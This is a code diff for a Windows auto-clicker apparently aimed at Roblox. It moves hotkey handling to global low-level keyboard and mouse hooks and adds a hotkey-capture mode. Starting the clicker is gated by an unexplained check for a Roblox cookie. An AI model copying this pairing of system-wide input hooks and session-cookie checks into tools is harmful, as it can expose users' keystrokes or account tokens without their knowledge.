+            if (CheckRobloxCookiePresent(hwnd))
+            {
+                g_running.store(true);
+                UpdateStatusText(hLblStatus,
+                    L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
+            }
+        }
+        return 0;
+    }
+
+    // WM_APP+3: 熱鍵觸發 — 停止
+    case WM_APP + 3:
+    {
+        UpdateStatusText(hLblStatus,
+            L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
         return 0;
     }
 
@@ -1163,20 +1224,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         break;
     }
 
-    case WM_HOTKEY:
-        if ((int)wp == HOTKEY_ID)
-        {
-            bool want_start = !g_running;
-            if (want_start && !CheckRobloxCookiePresent(hwnd))
-                return 0;
-            g_running = want_start;
-            UpdateStatusText(hLblStatus,
-                g_running
-                    ? L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D"
-                    : L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
-        }
-        return 0;
-
     case WM_COMMAND:
         switch (LOWORD(wp))
         {
@@ -1192,27 +1239,38 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
                     L"\u932F\u8AA4", MB_ICONERROR | MB_OK);
                 break;
             }
-            wchar_t hkbuf[64] = {};
-            GetWindowTextW(hEditHotkey, hkbuf, 64);
-            HKInfo hk = ParseHotkey(hkbuf);
-            if (!hk.ok)
-            {
-                MessageBoxW(hwnd,
-                    L"\u71B1\u9375\u683C\u5F0F\u7121\u6548\n\u4F8B\u5982: t  /  f6  /  ctrl+shift+a",
-                    L"\u932F\u8AA4", MB_ICONERROR | MB_OK);
-                break;
-            }
             g_cps = cps_val;
-            wcscpy_s(g_hotkey_spec, 64, hkbuf);
-            UnregisterHotKey(hwnd, HOTKEY_ID);
-            RegisterHotKey(hwnd, HOTKEY_ID, hk.mod, hk.vk);
+
+            wchar_t hk_name[64] = {};
+            VkToName(g_hotkey_vk.load(), hk_name, 64);
             wchar_t info[128];
-            swprintf_s(info, 128,
-                L"CPS = %d\n\u71B1\u9375 = %s", cps_val, g_hotkey_spec);
+            swprintf_s(info, 128, L"CPS = %d\n\u71B1\u9375 = %s", cps_val, hk_name);
             MessageBoxW(hwnd, info, L"\u8A2D\u5B9A\u66F4\u65B0", MB_ICONINFORMATION | MB_OK);
             break;
         }
+
+        // [修復 #1] 調整熱鍵按鈕 — 進入監聽模式
+        case IDC_BTN_SETHOTKEY:
+        {
+            // 暫停連點功能
+            g_running.store(false);
+
+            // 進入監聽模式
+            g_listening_hotkey.store(true);
+            SetWindowTextW(hEditHotkey, L"\u8ACB\u6309\u4EFB\u610F\u9375...");
+            SetWindowTextW(hBtnSetHotkey, L"\u2026");
+
+            // 停用開始/停止按鈕，避免在監聽中誤觸
+            EnableWindow(hBtnStart, FALSE);
+            EnableWindow(hBtnStop, FALSE);
+
+            UpdateStatusText(hLblStatus,
+                L"\u2328 \u6B63\u5728\u76E3\u807D\u65B0\u71B1\u9375\u2026 \u8ACB\u6309\u4EFB\u610F\u9375\u6216\u6ED1\u9F20\u5074\u9375");
+            break;
+        }
+
         case IDC_BTN_START:
+            if (g_listening_hotkey.load()) break;  // 監聽中不允許啟動
             if (!CheckRobloxCookiePresent(hwnd)) break;
             g_running = true;
             UpdateStatusText(hLblStatus,
@@ -1220,6 +1278,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             break;
 
         case IDC_BTN_STOP:
+            if (g_listening_hotkey.load()) break;
             g_running = false;
             UpdateStatusText(hLblStatus,
                 L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
@@ -1233,7 +1292,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             SetWindowTextW(hBtnPin,
                 g_pinned ? L"\u2736 \u5DF2\u91D8\u9078" : L"\u2736 \u91D8\u9078");
             break;
-
 
         case IDC_BTN_HELP:
             MessageBoxW(hwnd,
@@ -1279,9 +1337,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
     case WM_DESTROY:
         g_program_running = false;
         g_running         = false;
+        // 移除低階鉤子
+        if (g_kb_hook) { UnhookWindowsHookEx(g_kb_hook); g_kb_hook = nullptr; }
+        if (g_ms_hook) { UnhookWindowsHookEx(g_ms_hook); g_ms_hook = nullptr; }
         if (g_hwnd_cookie && IsWindow(g_hwnd_cookie))
             DestroyWindow(g_hwnd_cookie);
-        UnregisterHotKey(hwnd, HOTKEY_ID);
         if (g_mutex)     { CloseHandle(g_mutex); g_mutex = nullptr; }
         if (hIconFont)   { DeleteObject(hIconFont); hIconFont = nullptr; }
         timeEndPeriod(1);
